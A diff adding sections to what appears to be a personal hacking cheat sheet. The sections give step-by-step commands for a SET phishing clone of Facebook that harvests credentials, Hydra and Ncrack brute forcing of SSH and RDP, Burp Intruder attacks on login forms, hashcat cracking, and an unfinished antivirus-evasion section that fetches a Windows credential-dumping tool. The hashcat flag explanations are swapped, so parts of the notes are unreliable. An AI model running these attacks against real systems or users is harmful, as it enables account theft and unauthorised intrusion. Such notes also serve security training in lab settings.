@@ -442,6 +442,108 @@ sessions -i 1	# Reopen your previous session with victim (using ID 1 for example
 sysinfo
 
 
+# CREDENTIAL HARVESTER ATTACK (social engineering
+#############################
+setoolkit
+	1	# Select option 1...
+	2
+	3
+	2	# This will clone the site targeted
+	ifconfig	# Find your local IP address
+		192.168.0.109	# Enter your local IP into the prompt. 192.168.0.109 is example
+		http://facebook.com	# Eneter the target URL into the prompt. Using Facebook as example
+		y	# Start apache
+		# Open the rooted targets pc and use their browser to visit the targeted page. It should appear as if nothing's changed except it's actually your clone of the URL they're on
+		# When they enter credentials it will actually save to your system
+		cd /var/www/	# This is where target credentials are saved. Look for the "harvester_" file.
+
+
+# BRUTE FORCE SSH
+#################
+hydra -s 22 -v -V -l user -P /path/to/wordlist.txt -t 8 192.168.0.115 ssh
+	# -s	#  
+	# -v	# Max verbosity
+	# -V	# Max verbosity
+	# -l	# Login name
+	# -P	# The dictionary file to attack with
+	# -t	# Amount of threads to attack with. More = faster
+	# victim's metasploitable IP address
+	# ssh 	# Protocol to attack
+
+# BRUTE FORCE RDP
+#################
+# NCrack isn't good but works here (don't expet to use it too much)
+ncrack -vv --user jimmy -P /path/to/wordlist.txt 192.168.0.111:3389
+	# -vv	# Verbose output
+	# --user	# User name to attack
+	# -P	# Path to the dictionary file to attack with
+	# 192.168..	# Vitcim's local IP address with the target port number (RDP =3389)
+rdesktop -u jimmy -g 100% -PKD 192.168.0.111
+	# -u	# User to log in as
+	# -g 100%	# Screensize to use (as %)
+	# -PKD	# Victim's local IP. P = improve performance via pre-caching. K = don't override existing settings. D = hide decorations and hints.
+
+
+# BRUTE FORCE WEB FORMS
+############	#	# ###########
+# Make sure burpsuite is configured with your browser
+# Enable FoxyProxy via Firefox/Chrome extensions
+# In BurpSuite GUI enable Proxy > Intercept > (intercept button) ON
+# Attempt to log in with a random username/password (just make an attempt)
+# Right-click in BurpSuite and select "Send to intruder" (this is done on the: Proxy > Intercept > Raw. tab)
+# Go to "Inturder > # > Positions" tables
+# Click "Clear" to clear out pre-existing intrusion attempts
+# Highlight the user and password values in the textbox and press "Add" this should insert a different variable into each (do them separately)
+	# We want to make the credentials variables to be scanned through for later
+# In the "Attack type" drop down menu choose "Cluster Bomb"
+# In the "Payloads" tab under "Payload set" make sure it's "1" and "Payload type" is "Simple List"
+# In the "Payload Options" section add custom words or use a preset list. While under "Payload set 1" these will be possibilities for the first textbox of the form (generally username/email)
+# Change the "Payload set" to "2" and add data to the "Payload Options". This is usually the password/key part of the form
+# Click the "Start attack" button
+# A popup should show various intruder attacks.
+	# Look for entries where "Status" is different from most others
+	# With any luck these differences will be the login credentials
+
+
+# CRACKIG HASHES
+################
+# Message	= Input data
+# Digest	= Hash value
+# For practice go to an "md5 hash generator" off google.com and create an easy hash
+# Save the example hash in a .txt file. For example hashes.txt
+hash-identifier	# This tool can identify the hash type. It will have it's own prompts to enter your text:
+	# Copy/Paste in your hash
+hashcat -m 0 -a 0 /path/to/hashes.txt /path/to/wordlist.txt
+	# -m 0	# Hash mode. 0 = "straight" attack 
+	# -a 0	# Type of hash. 0 = md5
+	# Feel free to use GPU mode to crack hashes faster!
+
+
+# BYPASSING ANTIVIRUS (av)
+#####################
+# These are generally "signature based" - they look for strings inside of apps and trigger when wrong/not present
+wget https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
+	# Download the windows credentials editor (WCE) app
+	# Primary download at:	https://www.ampliasecurity.com/research.html
+unzip wce_v1_41beta_universal.zip
+# If you upload the wce.exe file to the victim it will probably be detected by the av
+# Find an av evadion tool on google.com (the "evade.zip" tool is no longer readily found)
+# THIS SECTION IS INCOMPLETE!
+# THIS SECTION IS INCOMPLETE!
+# THIS SECTION IS INCOMPLETE!
+# THIS SECTION IS INCOMPLETE!
+# THIS SECTION IS INCOMPLETE!
+
+
+
+
+
+
+
+
+
+
+
 
 
 
